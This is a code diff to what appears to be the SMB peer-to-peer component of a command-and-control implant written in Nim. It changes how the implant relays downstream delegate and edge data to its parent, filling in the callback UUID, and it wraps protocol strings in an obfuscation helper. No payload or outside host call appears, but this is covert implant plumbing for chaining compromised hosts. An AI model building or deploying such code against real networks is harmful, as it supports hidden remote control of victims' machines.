@@ -340,7 +340,7 @@ proc forwardIncomingDelegatesSmb*(msgJson: JsonNode) =
             discard rekeyConnectConnection(delegateUuid, newUuid)
             discard rekeyLinkConnection(delegateUuid, newUuid)
 
-proc collectDownstreamDelegatesSmb*(): tuple[delegates: JsonNode, edges: JsonNode] =
+proc collectDownstreamDelegatesSmb*(callbackUuid: string): tuple[delegates: JsonNode, edges: JsonNode] =
   ## Collect delegate and edge data from all downstream P2P connections
   var delegates = newJArray()
   var edges = newJArray()
@@ -352,7 +352,11 @@ proc collectDownstreamDelegatesSmb*(): tuple[delegates: JsonNode, edges: JsonNod
         delegates.add(d)
     elif resp.hasKey(obf("edges")):
       for e in resp[obf("edges")]:
-        edges.add(e)
+        # Fill source with our callback UUID (we are the parent)
+        var edgeCopy = e.copy()
+        if edgeCopy.hasKey(obf("source")) and edgeCopy[obf("source")].getStr() == "":
+          edgeCopy[obf("source")] = %callbackUuid
+        edges.add(edgeCopy)
   
   let linkResps = checkActiveLinkConnections()
   for resp in linkResps:
@@ -361,7 +365,10 @@ proc collectDownstreamDelegatesSmb*(): tuple[delegates: JsonNode, edges: JsonNod
         delegates.add(d)
     elif resp.hasKey(obf("edges")):
       for e in resp[obf("edges")]:
-        edges.add(e)
+        var edgeCopy = e.copy()
+        if edgeCopy.hasKey(obf("source")) and edgeCopy[obf("source")].getStr() == "":
+          edgeCopy[obf("source")] = %callbackUuid
+        edges.add(edgeCopy)
   
   return (delegates, edges)
 
@@ -696,7 +703,7 @@ proc start*(profile: SmbProfile) =
               # Send chunks if any
               if chunksToSend.len > 0:
                 # Collect downstream delegate data (multi-level P2P)
-                let (downDelegates, downEdges) = collectDownstreamDelegatesSmb()
+                let (downDelegates, downEdges) = collectDownstreamDelegatesSmb(profile.callbackUuid)
                 
                 let chunkResponse = %* {
                   obf("action"): obf("post_response"),
@@ -715,7 +722,7 @@ proc start*(profile: SmbProfile) =
                 continue
               
               # No chunks to send - check if there's downstream delegate data to relay
-              let (noChunkDelegates, noChunkEdges) = collectDownstreamDelegatesSmb()
+              let (noChunkDelegates, noChunkEdges) = collectDownstreamDelegatesSmb(profile.callbackUuid)
               if noChunkDelegates.len > 0 or noChunkEdges.len > 0:
                 let delegateResponse = %* {
                   obf("action"): obf("post_response"),
@@ -900,7 +907,7 @@ proc start*(profile: SmbProfile) =
                         taskResponses.add(execResult.response)
                   
                   # Collect downstream delegate data (multi-level P2P)
-                  let (taskDelegates, taskEdges) = collectDownstreamDelegatesSmb()
+                  let (taskDelegates, taskEdges) = collectDownstreamDelegatesSmb(profile.callbackUuid)
                   
                   # Send response
                   let taskingResponse = %* {
@@ -927,7 +934,7 @@ proc start*(profile: SmbProfile) =
                 else:
                   debug "[DEBUG] SMB P2P: No tasks in get_tasking response"
                   # Even without tasks, check for downstream delegate data to relay
-                  let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegatesSmb()
+                  let (noTaskDelegates, noTaskEdges) = collectDownstreamDelegatesSmb(profile.callbackUuid)
                   if noTaskDelegates.len > 0 or noTaskEdges.len > 0:
                     let delegateResponse = %* {
                       obf("action"): obf("post_response"),
